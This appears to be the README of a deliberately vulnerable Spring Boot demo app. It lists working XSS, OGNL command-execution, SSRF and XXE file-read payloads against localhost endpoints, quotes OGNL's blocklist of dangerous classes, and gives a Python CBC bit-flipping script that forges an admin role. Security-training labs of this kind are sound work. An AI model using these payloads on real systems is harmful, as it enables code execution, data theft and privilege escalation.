# SpringBoot-Vulnerable-Demo-2024
## XSS

[http://127.0.0.1:8080/greeting?name=<script>alert('xss')</script>](http://127.0.0.1:8080/greeting?name=%3Cscript%3Ealert(%27xss%27)%3C/script%3E)

[view-source:http://127.0.0.1:8080/greeting?name=<script>alert('xss')</script>](view-source:http://127.0.0.1:8080/greeting?name=%3Cscript%3Ealert(%27xss%27)%3C/script%3E)

[http://127.0.0.1:8080/greeting-vulnerable?name=<script>alert('xss')</script>](http://127.0.0.1:8080/greeting-vulnerable?name=%3Cscript%3Ealert(%27xss%27)%3C/script%3E)

[view-source:http://127.0.0.1:8080/greeting-vulnerable?name=<script>alert('xss')</script>](view-source:http://127.0.0.1:8080/greeting-vulnerable?name=%3Cscript%3Ealert(%27xss%27)%3C/script%3E)


## Ongl
- [https://codeql.github.com/codeql-query-help/java/java-ognl-injection/](https://codeql.github.com/codeql-query-help/java/java-ognl-injection/)'
- [https://xz.aliyun.com/t/10482](https://xz.aliyun.com/t/10482)
- 
@java.lang.Runtime@getRuntime().exec("calc")

http://127.0.0.1:8080/ongl-vulnerable

http://127.0.0.1:8080/ongl-vulnerable?name=%22aaaa%22.length
http://127.0.0.1:8080/ongl-vulnerable?name=@java.lang.Math@abs(-111)


http://127.0.0.1:8080/ongl-vulnerable?name=@java.lang.Runtime@getRuntime().exec(%22calc%22)


https://github.com/orphan-oss/ognl/blob/main/src/main/java/ognl/OgnlRuntime.java
```java
    public static Object invokeMethod(Object target, Method method, Object[] argsArray)
            throws InvocationTargetException, IllegalAccessException {
        boolean syncInvoke;
        boolean checkPermission;
        Boolean methodAccessCacheValue;
        Boolean methodPermCacheValue;

        if (_useStricterInvocation) {
            final Class<?> methodDeclaringClass = method.getDeclaringClass();  // Note: synchronized(method) call below will already NPE, so no null check.
            if ((AO_SETACCESSIBLE_REF != null && AO_SETACCESSIBLE_REF.equals(method)) ||
                    (AO_SETACCESSIBLE_ARR_REF != null && AO_SETACCESSIBLE_ARR_REF.equals(method)) ||
                    (SYS_EXIT_REF != null && SYS_EXIT_REF.equals(method)) ||
                    (SYS_CONSOLE_REF != null && SYS_CONSOLE_REF.equals(method)) ||
                    AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) ||
                    ClassResolver.class.isAssignableFrom(methodDeclaringClass) ||
                    MethodAccessor.class.isAssignableFrom(methodDeclaringClass) ||
                    MemberAccess.class.isAssignableFrom(methodDeclaringClass) ||
                    OgnlContext.class.isAssignableFrom(methodDeclaringClass) ||
                    Runtime.class.isAssignableFrom(methodDeclaringClass) ||
                    ClassLoader.class.isAssignableFrom(methodDeclaringClass) ||
                    ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) ||
                    AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass)) {
                // Prevent calls to some specific methods, as well as all methods of certain classes/interfaces
                //   for which no (apparent) legitimate use cases exist for their usage within OGNL invokeMethod().
                throw new IllegalAccessException("Method [" + method + "] cannot be called from within OGNL invokeMethod() " +
                        "under stricter invocation mode.");
            }
        }

```

## SSRF

curl -X POST http://127.0.0.1:8080/ssrf-vulnerable -d "hostname=http://127.0.0.1:8080/actuator/metrics"

curl -X POST http://127.0.0.1:8080/ssrf -d "hostname=http://127.0.0.1:8080/actuator/metrics"

actuator
http://127.0.0.1:8080/actuator/metrics
http://127.0.0.1:8080/actuator/beans


## XXE

<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///C:\\Windows\\system.ini'>]><root>&test;</root>

http://127.0.0.1:8080/xml-vulnerable?xml=%3Ctest%3EWorld%3C/test%3E

http://127.0.0.1:8080/xml-vulnerable?xml=%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20test%20SYSTEM%20%27file%3A%2F%2F%2FC%3A%5C%5CWindows%5C%5Csystem%2Eini%27%3E%5D%3E%3Croot%3E%26test%3B%3C%2Froot%3E

## Padding Oracle

https://www.nccgroup.com/us/research-blog/cryptopals-exploiting-cbc-padding-oracles/

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import base64
import requests


url = "http://127.0.0.1:8080"


def exploit():
    s = requests.Session()
    r = s.post(url + "/encrypt-vulnerable",
               data={"data": base64.b64encode(b"role=bdmin")})
    base64_bdmin_ciphertext_with_iv = r.json()["ciphertext"]
    raw_bdmin_ciphertext_with_iv = base64.b64decode(base64_bdmin_ciphertext_with_iv)
    iv = raw_bdmin_ciphertext_with_iv[0: 16]
    bdmin_ciphertext = raw_bdmin_ciphertext_with_iv[16:]

    # role=admin
    # 012345
    iv_list = list(iv)
    iv_list[5] = ord('a') ^ ord('b') ^ iv_list[5]

    payload = b""
    for _ in iv_list:
        payload += bytes.fromhex(format(_, '02x'))
    payload += bdmin_ciphertext

    r = s.post(url + "/decrypt-vulnerable",
               data={"data": base64_bdmin_ciphertext_with_iv})
    print(f"decrypted: {base64.b64decode(r.json()["plaintext"])}")

    r = s.post(url + "/decrypt-vulnerable",
               data={"data": base64.b64encode(payload)})
    print(f"exploited: {r.json()["plaintext"]}")


if __name__ == "__main__":
    exploit()
```